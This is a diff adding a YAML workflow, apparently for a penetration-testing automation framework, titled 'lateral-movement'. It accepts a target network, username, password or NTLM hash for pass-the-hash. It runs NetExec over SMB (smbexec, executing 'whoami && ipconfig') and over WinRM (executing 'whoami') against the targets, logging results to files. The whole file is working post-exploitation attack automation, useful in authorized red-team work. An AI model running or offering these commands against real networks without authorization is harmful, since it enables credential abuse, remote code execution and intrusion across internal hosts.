@@ -1,0 +1,51 @@
+name: lateral-movement
+description: Lateral movement — test discovered credentials across internal hosts
+  using SMB, WinRM, SSH, and RDP.
+tags:
+- post
+- lateral
+- movement
+- pivot
+- smb
+- winrm
+dispatch:
+  inputs:
+    target:
+      required: true
+      type: string
+      description: Target network or host file (CIDR or IP list)
+      alias: t
+    username:
+      required: true
+      type: string
+      description: Username to test
+    password:
+      type: string
+      default: ''
+      description: Password
+    hash:
+      type: string
+      default: ''
+      description: NTLM hash for pass-the-hash
+    log_command:
+      type: string
+      default: 'true'
+      description: Enable command logging
+jobs:
+  smb-move:
+    name: SMB Lateral Movement
+    steps:
+    - name: nxc-smb
+      run: nxc smb {{ inputs.target }} -u {{ inputs.username }} -p "{{ inputs.password
+        }}" --shares --exec-method smbexec -x "whoami && ipconfig" 2>&1 | tee {{ env.OFX_RUN_DIR
+        }}/nxc_smb_lateral.txt
+      continue-on-error: true
+      log-command: '{{ inputs.log_command }}'
+  winrm-move:
+    name: WinRM Lateral Movement
+    steps:
+    - name: nxc-winrm
+      run: nxc winrm {{ inputs.target }} -u {{ inputs.username }} -p "{{ inputs.password
+        }}" -x "whoami" 2>&1 | tee {{ env.OFX_RUN_DIR }}/nxc_winrm_lateral.txt
+      continue-on-error: true
+      log-command: '{{ inputs.log_command }}'
